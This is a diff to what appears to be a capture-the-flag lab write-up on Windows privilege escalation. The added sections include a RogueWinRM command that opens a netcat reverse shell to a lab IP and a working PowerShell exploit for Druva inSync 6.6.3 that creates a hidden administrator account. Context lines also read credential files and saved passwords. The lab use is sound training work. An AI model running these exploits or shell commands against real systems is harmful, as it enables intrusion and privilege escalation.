@@ -24,7 +24,7 @@ type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\Conso
 type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
 
 **There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop.**
 
@@ -35,7 +35,7 @@ cmdkey /list
 runas /savecred /user:WPRIVESC1\mike.katz cmd.exe
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 **Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user?**
 
@@ -246,3 +246,74 @@ sc.exe start THMService
 ```
 
 <figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+
+## Abusing dangerous privileges
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+nc -lvp 4442
+```
+
+**Victim(Browser)**
+
+```
+c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe 10.10.22.165 4442"
+```
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+## Abusing vulnerable software
+
+### Case Study: Druva inSync 6.6.3
+
+#### **Druva\_inSync\_exploit.ps1**
+
+```
+$ErrorActionPreference = "Stop"
+
+$cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add"
+
+$s = New-Object System.Net.Sockets.Socket(
+    [System.Net.Sockets.AddressFamily]::InterNetwork,
+    [System.Net.Sockets.SocketType]::Stream,
+    [System.Net.Sockets.ProtocolType]::Tcp
+)
+$s.Connect("127.0.0.1", 6064)
+
+$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
+$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
+$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
+$length = [System.BitConverter]::GetBytes($command.Length);
+
+$s.Send($header)
+$s.Send($rpcType)
+$s.Send($length)
+$s.Send($command)
+```
+
+**Victim**
+
+```
+cd C:\tools\
+.\Druva_inSync_exploit.ps1
+```
+
+<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
+
+**Victim(Powershell)**
+
+```
+runas /user:pwned "C:\Windows\system32\cmd.exe"
+Enter the password for pwnd: SimplePass123
+```
+
+**Victim(cmd)**
+
+```
+powershell.exe -Command "Start-Process cmd "/k cd /d %cd%" -Verb RunAs"
+```
+
+<figure><img src="../../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>
